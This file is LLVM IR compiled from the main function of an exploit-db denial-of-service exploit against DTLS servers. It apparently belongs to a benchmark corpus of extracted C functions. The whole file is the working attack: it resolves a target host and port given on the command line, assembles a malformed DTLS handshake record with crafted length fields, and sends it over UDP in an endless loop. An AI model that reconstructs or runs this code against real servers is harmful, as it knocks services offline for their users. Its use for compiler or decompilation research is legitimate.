; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_8720.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_8720.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i8**, i32, i32 }
%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i8 }
%struct.sockaddr = type { i32 }

@MAX_LEN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [49 x i8] c"Pass the host and port of the target DTLS server\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"[-] Error: %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"Unknown host specified\00", align 1
@.str.3 = private unnamed_addr constant [20 x i8] c"[-] Error: %s (%s)\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [27 x i8] c"Failed creating UDP socket\00", align 1
@.str.5 = private unnamed_addr constant [25 x i8] c"Failed to connect socket\00", align 1
@.str.6 = private unnamed_addr constant [12 x i8] c"\16\FE\FF\00\00\00\00\00\00\00\00\00", align 1
@.str.7 = private unnamed_addr constant [2 x i8] c"\01\00", align 1
@.str.8 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"\00\01\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] zeroinitializer, align 1
@.str.11 = private unnamed_addr constant [41 x i8] c"[+] Firing loads of packets at %s:%s...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* @MAX_LEN, align 4
  %15 = zext i32 %14 to i64
  %16 = call i8* @llvm.stacksave()
  store i8* %16, i8** %12, align 8
  %17 = alloca i8, i64 %15, align 16
  store i64 %15, i64* %13, align 8
  %18 = load i32, i32* %4, align 4
  %19 = icmp slt i32 %18, 3
  br i1 %19, label %20, label %24

20:                                               ; preds = %2
  store i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str, i64 0, i64 0), i8** %9, align 8
  %21 = load i8*, i8** %9, align 8
  %22 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 1) #4
  unreachable

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call %struct.hostent* @gethostbyname(i8* %27)
  store %struct.hostent* %28, %struct.hostent** %10, align 8
  %29 = load %struct.hostent*, %struct.hostent** %10, align 8
  %30 = icmp ne %struct.hostent* %29, null
  br i1 %30, label %37, label %31

31:                                               ; preds = %24
  store i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0), i8** %9, align 8
  %32 = load i8*, i8** %9, align 8
  %33 = load i32, i32* @errno, align 4
  %34 = call i8* @strerror(i32 %33)
  %35 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0), i8* %32, i8* %34)
  %36 = call i32 @exit(i32 1) #4
  unreachable

37:                                               ; preds = %24
  %38 = load %struct.hostent*, %struct.hostent** %10, align 8
  %39 = getelementptr inbounds %struct.hostent, %struct.hostent* %38, i32 0, i32 2
  %40 = load i32, i32* %39, align 4
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %40, i32* %41, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %43 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %42, i32 0, i32 0
  %44 = load %struct.hostent*, %struct.hostent** %10, align 8
  %45 = getelementptr inbounds %struct.hostent, %struct.hostent* %44, i32 0, i32 0
  %46 = load i8**, i8*** %45, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 0
  %48 = load i8*, i8** %47, align 8
  %49 = load %struct.hostent*, %struct.hostent** %10, align 8
  %50 = getelementptr inbounds %struct.hostent, %struct.hostent* %49, i32 0, i32 1
  %51 = load i32, i32* %50, align 8
  %52 = call i32 @memcpy(i8* %43, i8* %48, i32 %51)
  %53 = load i8**, i8*** %5, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 2
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @atoi(i8* %55)
  %57 = call i32 @htons(i32 %56)
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i32 %57, i32* %58, align 4
  %59 = load i32, i32* @AF_INET, align 4
  %60 = load i32, i32* @SOCK_DGRAM, align 4
  %61 = call i32 @socket(i32 %59, i32 %60, i32 0)
  store i32 %61, i32* %6, align 4
  %62 = load i32, i32* %6, align 4
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %70

64:                                               ; preds = %37
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.4, i64 0, i64 0), i8** %9, align 8
  %65 = load i8*, i8** %9, align 8
  %66 = load i32, i32* @errno, align 4
  %67 = call i8* @strerror(i32 %66)
  %68 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0), i8* %65, i8* %67)
  %69 = call i32 @exit(i32 1) #4
  unreachable

70:                                               ; preds = %37
  %71 = load i32, i32* %6, align 4
  %72 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %73 = call i32 @connect(i32 %71, %struct.sockaddr* %72, i32 12)
  store i32 %73, i32* %7, align 4
  %74 = load i32, i32* %7, align 4
  %75 = icmp eq i32 %74, -1
  br i1 %75, label %76, label %82

76:                                               ; preds = %70
  store i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0), i8** %9, align 8
  %77 = load i8*, i8** %9, align 8
  %78 = load i32, i32* @errno, align 4
  %79 = call i8* @strerror(i32 %78)
  %80 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0), i8* %77, i8* %79)
  %81 = call i32 @exit(i32 1) #4
  unreachable

82:                                               ; preds = %70
  store i8* %17, i8** %8, align 8
  %83 = load i8*, i8** %8, align 8
  %84 = call i32 @memcpy(i8* %83, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.6, i64 0, i64 0), i32 11)
  %85 = load i8*, i8** %8, align 8
  %86 = getelementptr inbounds i8, i8* %85, i64 11
  store i8* %86, i8** %8, align 8
  %87 = load i8*, i8** %8, align 8
  %88 = load i32, i32* @MAX_LEN, align 4
  %89 = sext i32 %88 to i64
  %90 = load i8*, i8** %8, align 8
  %91 = ptrtoint i8* %90 to i64
  %92 = ptrtoint i8* %17 to i64
  %93 = sub i64 %91, %92
  %94 = add nsw i64 %93, 2
  %95 = sub nsw i64 %89, %94
  %96 = trunc i64 %95 to i32
  %97 = call i32 @put16(i8* %87, i32 %96)
  %98 = load i8*, i8** %8, align 8
  %99 = getelementptr inbounds i8, i8* %98, i64 2
  store i8* %99, i8** %8, align 8
  %100 = load i8*, i8** %8, align 8
  %101 = call i32 @memcpy(i8* %100, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0), i32 1)
  %102 = load i8*, i8** %8, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 1
  store i8* %103, i8** %8, align 8
  %104 = load i8*, i8** %8, align 8
  %105 = call i32 @memcpy(i8* %104, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8, i64 0, i64 0), i32 1)
  %106 = load i8*, i8** %8, align 8
  %107 = getelementptr inbounds i8, i8* %106, i64 1
  store i8* %107, i8** %8, align 8
  %108 = load i8*, i8** %8, align 8
  %109 = load i32, i32* @MAX_LEN, align 4
  %110 = sext i32 %109 to i64
  %111 = load i8*, i8** %8, align 8
  %112 = ptrtoint i8* %111 to i64
  %113 = ptrtoint i8* %17 to i64
  %114 = sub i64 %112, %113
  %115 = add nsw i64 %114, 2
  %116 = add nsw i64 %115, 8
  %117 = sub nsw i64 %110, %116
  %118 = trunc i64 %117 to i32
  %119 = call i32 @put16(i8* %108, i32 %118)
  %120 = load i8*, i8** %8, align 8
  %121 = getelementptr inbounds i8, i8* %120, i64 2
  store i8* %121, i8** %8, align 8
  %122 = load i8*, i8** %8, align 8
  %123 = call i32 @memcpy(i8* %122, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0), i32 2)
  %124 = load i8*, i8** %8, align 8
  %125 = getelementptr inbounds i8, i8* %124, i64 2
  store i8* %125, i8** %8, align 8
  %126 = load i8*, i8** %8, align 8
  %127 = call i32 @memcpy(i8* %126, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0), i32 3)
  %128 = load i8*, i8** %8, align 8
  %129 = getelementptr inbounds i8, i8* %128, i64 3
  store i8* %129, i8** %8, align 8
  %130 = load i8*, i8** %8, align 8
  %131 = call i32 @memcpy(i8* %130, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8, i64 0, i64 0), i32 1)
  %132 = load i8*, i8** %8, align 8
  %133 = getelementptr inbounds i8, i8* %132, i64 1
  store i8* %133, i8** %8, align 8
  %134 = load i8*, i8** %8, align 8
  %135 = load i32, i32* @MAX_LEN, align 4
  %136 = sext i32 %135 to i64
  %137 = load i8*, i8** %8, align 8
  %138 = ptrtoint i8* %137 to i64
  %139 = ptrtoint i8* %17 to i64
  %140 = sub i64 %138, %139
  %141 = add nsw i64 %140, 2
  %142 = sub nsw i64 %136, %141
  %143 = trunc i64 %142 to i32
  %144 = call i32 @put16(i8* %134, i32 %143)
  %145 = load i8*, i8** %8, align 8
  %146 = getelementptr inbounds i8, i8* %145, i64 2
  store i8* %146, i8** %8, align 8
  %147 = load i8*, i8** %8, align 8
  %148 = load i32, i32* @MAX_LEN, align 4
  %149 = sext i32 %148 to i64
  %150 = load i8*, i8** %8, align 8
  %151 = ptrtoint i8* %150 to i64
  %152 = ptrtoint i8* %17 to i64
  %153 = sub i64 %151, %152
  %154 = sub nsw i64 %149, %153
  %155 = trunc i64 %154 to i32
  %156 = call i32 @memset(i8* %147, i8 signext 0, i32 %155)
  %157 = load i8**, i8*** %5, align 8
  %158 = getelementptr inbounds i8*, i8** %157, i64 1
  %159 = load i8*, i8** %158, align 8
  %160 = load i8**, i8*** %5, align 8
  %161 = getelementptr inbounds i8*, i8** %160, i64 2
  %162 = load i8*, i8** %161, align 8
  %163 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.11, i64 0, i64 0), i8* %159, i8* %162)
  br label %164

164:                                              ; preds = %165, %82
  br label %165

165:                                              ; preds = %164
  %166 = load i32, i32* %6, align 4
  %167 = load i32, i32* @MAX_LEN, align 4
  %168 = call i32 @send(i32 %166, i8* %17, i32 %167, i32 0)
  br label %164
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i8* @strerror(i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @put16(i8*, i32) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
